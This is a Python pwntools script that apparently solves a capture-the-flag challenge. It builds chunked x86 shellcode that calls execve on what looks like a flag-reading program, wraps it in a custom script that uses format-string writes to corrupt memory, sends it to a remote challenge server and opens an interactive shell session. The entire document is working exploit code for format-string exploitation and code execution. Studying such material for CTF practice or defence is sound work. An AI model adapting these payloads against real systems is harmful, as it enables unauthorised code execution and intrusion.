from pwn import *
import tty

#shellcode + jmp $+1
k1='h\x01\x01\x01\x01\x814$`f\x01\x01hadfl'+"\xeb\x01"
k2='h//re\x89\xe3h\x01\x01\x01\x01'+"\xeb\x01"
k3='\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q'+"\xeb\x01"
k4='\x89\xe11\xd2j\x0bX\xcd\x80'
k='''
def kirin(n)
   printf "%%80c%%7$hhn",1,2,3;
   printf "%%231c%%17$hhn",1,2,3;
   printf "%s"
   printf "%s"
   printf "%s"
   printf "%s"
end

def  magic(n)
    kirin(n)
end

magic(1)
'''  %(k4,k3,k2,k1)

context.log_level="debug"
p=remote("chall.0ops.sjtu.edu.cn",20202)
#p=process("./entry")
#gdb.attach(p)
p.sendafter(".\n",k)
p.shutdown()#send EOF
p.interactive()

